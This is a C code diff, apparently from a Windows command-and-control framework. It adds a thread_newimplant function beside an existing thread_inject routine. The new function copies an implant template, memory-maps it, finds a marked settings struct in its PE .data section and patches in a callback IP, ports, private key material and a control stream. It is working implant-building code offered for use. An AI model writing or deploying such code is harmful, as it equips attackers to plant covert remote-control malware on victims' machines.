@@ -989,3 +989,86 @@ DWORD WINAPI thread_inject(struct inject_params_t* params) {
 	free(params);
 	return 0;
 }
+
+struct _implant_settings_t {
+	uint16_t x6969;
+	uint8_t use_me;
+
+	char ip[16];
+	char remote_port[16];
+	char local_port[16];
+
+	char priv[128];
+	uint32_t priv_len;
+
+	tremont_stream_id ctrl_stream;
+	char auth[128];
+	uint32_t auth_len;
+};
+
+DWORD WINAPI thread_newimplant(struct newimplant_params_t* params) {
+	int res = -1;
+
+	printf("Creating new implant...\n");
+
+	CopyFile(params->path_to_template, L"new_implant.exe", FALSE);
+
+	HANDLE file_handle;
+	file_handle = CreateFileA("new_implant.exe",
+		GENERIC_ALL,
+		0,
+		NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL,
+		NULL
+	);
+
+	HANDLE map_handle;
+	map_handle = CreateFileMapping(file_handle,
+		NULL, PAGE_READWRITE, 0, 0, NULL);
+	
+	if (map_handle == 0) {
+		printf("Unable to get a handle to new_implant.exe!\n");
+		return -1;
+	}
+
+	char* file_mmap;
+	file_mmap = MapViewOfFile(map_handle, 
+		FILE_MAP_ALL_ACCESS, 0, 0, 0);
+	if (file_mmap == 0) {
+		printf("Unable to create mmap for new_implant.exe!\n");
+		return -1;
+	}
+
+	IMAGE_DOS_HEADER* dos;
+	IMAGE_NT_HEADERS* nt;
+	IMAGE_SECTION_HEADER* section;
+
+	dos = (IMAGE_DOS_HEADER*)file_mmap;
+	nt = file_mmap + (uintptr_t)dos->e_lfanew;
+	section = IMAGE_FIRST_SECTION(nt);
+
+	while (strncmp(".data", section->Name, 255)) section++;
+
+	struct _implant_settings_t* settings_ptr;
+	settings_ptr = file_mmap + section->PointerToRawData;
+	
+	while (settings_ptr->x6969 != 0x6969) (uintptr_t)settings_ptr++;
+
+	settings_ptr->use_me = 1;
+	strncpy(settings_ptr->ip, params->ip, 16);
+	strncpy(settings_ptr->remote_port, params->remote_port, 16);
+	strncpy(settings_ptr->local_port, params->local_port, 16);
+
+	tremont_getkey_nexus(settings_ptr->priv,
+		settings_ptr->priv_len, params->ctx->transport_pcb->nexus);
+
+	settings_ptr->ctrl_stream = params->ctrl_stream;
+	
+	printf("Created new implant!\n");
+
+	CloseHandle(map_handle);
+	CloseHandle(file_handle);
+	free(params);
+	return 0;
+}
